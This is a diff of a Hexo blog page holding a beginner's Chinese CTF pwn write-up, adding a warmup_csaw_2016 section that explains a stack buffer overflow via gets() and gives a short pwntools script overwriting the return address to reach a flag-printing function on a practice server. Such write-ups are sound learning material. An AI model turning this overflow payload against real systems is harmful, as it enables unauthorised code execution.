@@ -8,20 +8,22 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>第一周pwn | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="rip先用checksec查看开启了哪些保护机制（这种题就没必要保护了吧！！！）   Arch:判断是拉进ida 32还是64，使用p32还是p64(为什么这个是32但要拉进64？) RELRO:此项技术主要针对GOT改写的攻击方式。分为Partial和Full两种，部分（Partial）RELRO易受到攻击，而完全(Full)RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序启动时">
+  <meta name="description" content="题目rip先用checksec查看开启了哪些保护机制（这种题就没必要保护了吧！！！）   Arch:判断是拉进ida 32还是64，使用p32还是p64(为什么这个是32但要拉进64？) RELRO:此项技术主要针对GOT改写的攻击方式。分为Partial和Full两种，部分（Partial）RELRO易受到攻击，而完全(Full)RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序启">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第一周pwn">
 <meta property="og:url" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="rip先用checksec查看开启了哪些保护机制（这种题就没必要保护了吧！！！）   Arch:判断是拉进ida 32还是64，使用p32还是p64(为什么这个是32但要拉进64？) RELRO:此项技术主要针对GOT改写的攻击方式。分为Partial和Full两种，部分（Partial）RELRO易受到攻击，而完全(Full)RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序启动时">
+<meta property="og:description" content="题目rip先用checksec查看开启了哪些保护机制（这种题就没必要保护了吧！！！）   Arch:判断是拉进ida 32还是64，使用p32还是p64(为什么这个是32但要拉进64？) RELRO:此项技术主要针对GOT改写的攻击方式。分为Partial和Full两种，部分（Partial）RELRO易受到攻击，而完全(Full)RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序启">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_17-42-47.png">
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_18-15-09.png">
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_18-17-10.png">
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-30-58.png">
 <meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-33-16.png">
+<meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-16_17-09-13.png">
+<meta property="og:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-16_17-10-27.png">
 <meta property="article:published_time" content="2023-01-15T09:40:19.000Z">
-<meta property="article:modified_time" content="2023-01-15T11:34:10.733Z">
+<meta property="article:modified_time" content="2023-01-16T09:22:46.524Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_17-42-47.png">
@@ -181,7 +183,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>先用checksec查看开启了哪些保护机制（这种题就没必要保护了吧！！！）</p>
+        <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>先用checksec查看开启了哪些保护机制（这种题就没必要保护了吧！！！）</p>
 <img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_17-42-47.png" style="zoom:80%;">
 
 <p>Arch:判断是拉进ida 32还是64，使用p32还是p64(为什么这个是32但要拉进64？)</p>
@@ -216,6 +218,14 @@
 <p>之后kali运行，轻松得到flag</p>
 <h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>nc，然后cat得到flag<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-30-58.png" style="zoom:33%;"></p>
 <h2 id="ctfshow-pwn签到"><a href="#ctfshow-pwn签到" class="headerlink" title="ctfshow pwn签到"></a>ctfshow pwn签到</h2><p>题目直接把命令给了，太贴心了呜呜呜<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-15_19-33-16.png"></p>
+<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>首先checksec检查一下，<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-16_17-09-13.png"></p>
+<p>依旧无事发生，拉进ida里分析。</p>
+<p>main函数中有危险函数gets，<img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8pwn/Snipaste_2023-01-16_17-10-27.png">同时，发现v5和rbp(对应32位中的ebp)的距离是40h，也就是说只需要40h+8就可以覆盖返回地址</p>
+<p>之后再来寻找目标函数地址，shift+f12寻找，找到cat flag.txt，右键＋X找到目标函数sub_40060D，开始于40060D。</p>
+<p>编写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26137</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(<span class="number">0x40060D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行得到flag</p>
 
       
 
